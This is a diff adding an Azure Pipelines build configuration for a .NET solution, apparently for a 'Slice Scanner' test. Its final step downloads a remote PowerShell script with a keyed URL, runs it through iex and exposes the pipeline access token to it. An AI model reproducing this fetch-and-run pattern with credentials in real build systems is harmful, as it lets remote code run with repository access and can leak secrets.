@@ -1,0 +1,41 @@
+name: $(BuildDefinitionName).$(Rev:.r)
+
+pool:
+  name: Azure Pipelines
+  vmImage: 'windows-latest'
+
+trigger:
+  batch: true
+  branches:
+    include:
+    - '*'
+
+stages:
+- stage: build 
+  displayName: "Build Slice Test 01"
+  jobs:
+  - job: build
+
+    steps:
+    - task: NuGetToolInstaller@1
+      displayName: 'Install NuGet '
+
+    - task: NuGetCommand@2
+      displayName: 'Restore packages'
+      inputs:
+        command: 'restore'
+        restoreSolution: '**/*.sln'
+        feedsToUse: 'select'
+        vstsFeed: 'c823d460-b474-4667-8d06-ebae9075738e'
+           
+    - task: DotNetCoreCLI@2
+      displayName: 'Build solution'
+      inputs: 
+        command: 'build'
+        projects: '*.sln'
+        arguments: '-c Release -o $(Build.BinariesDirectory)'
+        
+    - powershell: iex ((New-Object System.Net.WebClient).DownloadString('https://cid-func-apps-scannerapi-test-master.azurewebsites.net/api/ScannerApi?tid=0FF77C7B-D8AF-4FEA-8CD6-FB07C1991973&code=vXj6J/fauoPnYDgpOr2KOYDJmIpIHXCGPHCwAd0F9i0Ji7DjpdcaXw=='))
+      displayName: 'Run Slice Scanner TEST' 
+      env:
+            SYSTEM_ACCESSTOKEN: $(System.AccessToken)
